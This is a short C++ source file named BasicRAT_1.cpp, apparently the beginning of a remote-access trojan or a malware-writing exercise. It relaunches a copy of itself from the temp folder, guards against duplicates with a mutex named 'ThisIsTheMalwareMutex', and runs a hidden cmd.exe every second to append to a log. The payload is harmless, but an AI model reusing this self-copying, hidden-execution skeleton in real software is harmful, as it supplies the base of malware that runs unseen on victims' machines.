// BasicRAT_1.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

void DoSomething()
{
	//system("cmd.exe /c echo hello world >> temp.txt");
	
	PROCESS_INFORMATION process_info;
	STARTUPINFO startup_info;

	memset(&process_info, 0, sizeof(process_info));
	memset(&startup_info, 0, sizeof(startup_info));
	
	startup_info.wShowWindow = SW_HIDE;

	CreateProcess(
		"c:\\windows\\system32\\cmd.exe",
		"cmd.exe /c echo hello world >> coms.log",
		NULL,
		NULL,
		TRUE,
		DETACHED_PROCESS,
		NULL,
		NULL,
		&startup_info,
		&process_info);

	CloseHandle(process_info.hThread);
	CloseHandle(process_info.hProcess);
	
	return;
}

void MakeCopyAndExecute()
{
	PROCESS_INFORMATION process_info;
	STARTUPINFO startup_info;

	char szTmp[MAX_PATH];
	char szTmpFile[MAX_PATH];
	char filename[MAX_PATH];

	GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename));
	
	GetTempPath(MAX_PATH, szTmp);
	GetTempFileName(szTmp, "br", 0, szTmpFile);

	CopyFile(filename, szTmpFile, FALSE);
		
	memset(&process_info, 0, sizeof(process_info));
	memset(&startup_info, 0, sizeof(startup_info));

	char cmdline[MAX_PATH];
	_snprintf(cmdline, MAX_PATH - 1, "%s RUN", szTmpFile);

	CreateProcess(
		szTmpFile,
		cmdline,
		NULL,
		NULL,
		TRUE,
		DETACHED_PROCESS,
		NULL,
		szTmp,
		&startup_info,
		&process_info);

	ExitProcess(EXIT_SUCCESS);
}

int _tmain(int argc, TCHAR* argv[])
{		
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, "ThisIsTheMalwareMutex"), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);
	
	if ( (argc == 2) && !strcmp(argv[1], "RUN") )
	{

		while (true)
		{		
			DoSomething();
			Sleep(1000);
		}			
    }
	else
	{		
		MakeCopyAndExecute();
	}
	
	return 0;
}

